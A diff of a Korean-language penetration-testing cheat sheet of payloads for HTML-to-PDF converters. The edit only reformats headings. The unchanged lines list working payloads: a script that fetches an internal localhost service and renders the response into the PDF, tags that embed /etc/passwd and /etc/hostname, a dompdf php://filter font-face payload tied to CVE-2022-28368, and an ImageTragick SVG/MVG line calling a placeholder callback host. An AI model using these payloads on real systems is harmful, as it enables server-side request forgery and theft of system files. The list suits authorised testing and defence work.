@@ -1,6 +1,6 @@
 ### 기본 페이로드
 
-**JS 실행 (puppeteer/headless Chrome):**
+#### JS 실행 (puppeteer/headless Chrome)
 - `<script>document.write("JS_EXECUTED_"+Date.now())</script>` (PDF에 결과 캡처되면 확인)
 - `<div id=x></div><script>fetch("http://127.0.0.1:8080/").then(r=>r.text()).then(t=>document.getElementById("x").innerText=t)</script>` (내부 fetch → DOM → PDF)
 
@@ -19,10 +19,10 @@
 - `<annotation file="/etc/hostname" content="/etc/hostname" icon="Graph" title="x"/>` (pd4ml 등)
 - `<embed src="file:///etc/passwd" type="text/plain">`
 
-**RCE (dompdf 구버전, CVE-2022-28368):**
+#### RCE (dompdf 구버전, CVE-2022-28368)
 - `<style>@font-face{font-family:x;src:url("php://filter/resource=/etc/passwd");}</style>`
 
-**ImageMagick RCE (이미지 변환 결합):**
+#### ImageMagick RCE (이미지 변환 결합)
 - MVG/SVG 입력 (`fill 'url(https://CALLBACK/imgtragick)'`)
 
 ---
